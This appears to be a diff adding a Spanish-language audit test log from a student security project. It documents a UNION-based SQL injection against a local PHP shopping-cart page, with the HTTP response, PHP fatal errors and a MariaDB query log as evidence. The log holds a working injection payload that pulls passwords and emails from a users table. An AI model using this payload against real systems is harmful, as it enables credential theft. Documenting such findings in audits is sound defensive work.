@@ -1,0 +1,41 @@
+=== CP-CART-001: SQLi UNION-based en carrito.php (iditems) ===
+
+--- HALLAZGO PREVIO (no contemplado en el analisis estatico de Parte 1): ---
+carrito.php::insertar() nunca inicializa $_SESSION['carrito'] como array antes de hacer count($_SESSION['carrito']).
+En PHP 7.x esto era solo un Warning (count(null) devolvia 0). En PHP 8.x, count() sobre null lanza TypeError fatal.
+Consecuencia: TODA llamada con op=1 (agregar item), incluso con datos 100% legitimos, termina en Fatal Error
+DESPUES de que la consulta SQL ya se ejecuto contra la base de datos. Se verifica esto con el query log de MariaDB.
+
+--- Paso 1: iniciar sesion ---
+Sesion iniciada.
+
+--- Paso 2: activar general_log de MariaDB para verificar que la consulta inyectada SI se ejecuta en el motor de BD ---
+
+--- Paso 3: POST carrito.php con payload UNION SELECT sobre tabla usuarios ---
+op=1&iditems=1 UNION SELECT 1,password,email FROM usuarios WHERE Id=1-- 
+HTTP/1.1 200 OK
+Host: localhost:8000
+Date: Thu, 02 Jul 2026 01:00:06 GMT
+Connection: close
+X-Powered-By: PHP/8.5.8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-type: text/html; charset=UTF-8
+
+<br />
+<b>Warning</b>:  Undefined array key "carrito" in <b>/home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/carrito.php</b> on line <b>18</b><br />
+<br />
+<b>Warning</b>:  Undefined array key "carrito" in <b>/home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/carrito.php</b> on line <b>23</b><br />
+<br />
+<b>Fatal error</b>:  Uncaught TypeError: count(): Argument #1 ($value) must be of type Countable|array, null given in /home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/carrito.php:23
+Stack trace:
+#0 /home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/carrito.php(8): insertar()
+#1 {main}
+  thrown in <b>/home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/carrito.php</b> on line <b>23</b><br />
+
+--- Paso 4: evidencia en el query log de MariaDB: la consulta UNION SELECT fue recibida y ejecutada por el motor, sin error de sintaxis SQL ---
+		   300 Query	select id, nombre, precio from items where id=1 UNION SELECT 1,password,email FROM usuarios WHERE Id=1--
+
+--- Paso 5 (informativo): intento de recuperar el carrito via mostrar_carrito.php. Se espera Fatal Error de PHP (TypeError en count()),
+que impide que el dato exfiltrado llegue a mostrarse en la interfaz, aunque la consulta SI se ejecuto exitosamente en el paso 3/4 ---
